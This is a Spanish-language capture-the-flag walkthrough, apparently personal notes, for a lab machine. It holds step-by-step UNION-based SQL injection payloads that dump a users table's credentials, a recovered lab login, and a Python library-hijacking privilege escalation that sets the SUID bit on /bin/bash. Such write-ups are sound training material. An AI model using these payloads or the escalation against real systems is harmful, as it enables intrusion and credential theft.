Hacemos el escaneo de nmap:
![[Pasted image 20240607140030.png]]
Y esto corre por el puerto 80:
![[Pasted image 20240607135434.png]]
Si ponemos una comilla, nos pone que no está autorizado, por lo que podemos intentar una inyección SQL:
![[Pasted image 20240607135514.png]]
Vamos a probar cuantas columnas hay, donde tras ir probando por 1,2 y 3, vemos que hay 3:
```bash
' union select 1,2,3-- -
```
![[Pasted image 20240607135606.png]]
Si queremos ver el nombre de la base de datos exitente, usamos la siguiente query:
```bash
' union select 1,database(),3-- -
```
![[Pasted image 20240607135717.png]]
Ahora, si queremos obtener el nombre de la tabla, usamos la siguiente query:
```bash
' union select 1,table_name,3 from information_schema.tables where table_schema='testdb'-- -
```
![[Pasted image 20240607135812.png]]
Para ver las columnas de la tabla, usamos la siguiente query:
```bash
' union select 1,column_name,3 from information_schema.columns where table_schema='testdb' and table_name='users'-- -
```
![[Pasted image 20240607135909.png]]
Y ahora para ver los registros, usamos la siguiente query:
```bash
' union select 1,group_concat(username,':',password),3 from testdb.users-- -
```
![[Pasted image 20240607135950.png]]
Hemos encontrado las siguientes credenciales:
```bash
kvzlx:kvzlxpassword 
```
Y entramos por ssh:
![[Pasted image 20240607140126.png]]
Si ejecutamos el siguiente comando, nos encontramos con que podemos ejecutar un script de python como root:
![[Pasted image 20240607140156.png]]
Y para la escalada hay que explotar un python library hijacking, donde crearemos un archivo llamado psutil.py que será llamado cuando ejecutemos como root el otro script, y así ejecutamos el comando chmod u+s /bin/bash para cambiarle el permiso a la bash:
![[Pasted image 20240607140403.png]]
Ejecutamos el script:
```python
sudo /usr/bin/python3 /home/kvzlx/system_info.py
```
![[Pasted image 20240607140454.png]]